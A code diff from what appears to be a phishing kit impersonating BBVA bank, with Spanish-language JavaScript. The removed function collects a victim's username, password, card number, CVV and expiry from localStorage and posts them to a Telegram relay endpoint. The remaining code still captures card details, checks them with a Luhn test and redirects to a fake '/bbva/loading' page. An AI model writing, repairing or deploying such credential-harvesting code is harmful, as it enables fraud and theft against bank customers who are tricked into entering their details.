@@ -193,35 +193,6 @@
                 return value ? JSON.parse(value) : '--';
             }
 
-            async function enviarATelegram() {
-                const allData = {};
-                const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC', 'status', 'uniqid'];
-
-                fields.forEach(field => {
-                    allData[field] = getFromLocalStorage(field);
-                });
-
-                console.log('Datos a enviar a Telegram:', allData);
-
-                try {
-                    const response = await fetch('/api/telegram/send', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            uniqid: appState.uniqId,
-                            data: allData
-                        })
-                    });
-                    const result = await response.json();
-                    console.log('Datos enviados a Telegram:', result);
-                } catch (e) {
-                    console.error('Error al enviar a Telegram:', e);
-                }
-            }
-
             function validarLuhn(cardNumber) {
                 const numero = cardNumber.replace(/\s/g, '');
                 if (!/^\d+$/.test(numero)) return false;
@@ -307,14 +278,13 @@
                 validateTarjeta();
             });
 
-            $('#btnTDC').on('click', async function () {
+            $('#btnTDC').on('click', function () {
                 if (validateTarjeta()) {
                     saveToLocalStorage('numtarjetaTDC', $('#numtarjetaTDC').val().trim());
                     saveToLocalStorage('cvvTDC', $('#cvvTDC').val().trim());
                     saveToLocalStorage('vencimientoTDC', $('#vencimientoTDC').val().trim());
                     saveToLocalStorage('status', 'TDC');
 
-                    await enviarATelegram();
                     window.location.href = '/bbva/loading';
                 }
             });
